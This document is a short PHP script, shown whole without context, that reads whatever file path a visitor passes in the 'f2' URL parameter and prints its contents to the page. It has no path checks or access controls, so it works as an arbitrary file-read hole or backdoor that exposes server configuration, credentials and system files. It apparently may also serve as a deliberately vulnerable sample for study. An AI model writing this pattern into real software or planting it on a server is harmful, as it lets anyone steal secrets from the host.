<?php
if(isset($_GET['f2'])){
    echo nl2br(htmlspecialchars(file_get_contents($_GET['f2'])));
}
?>
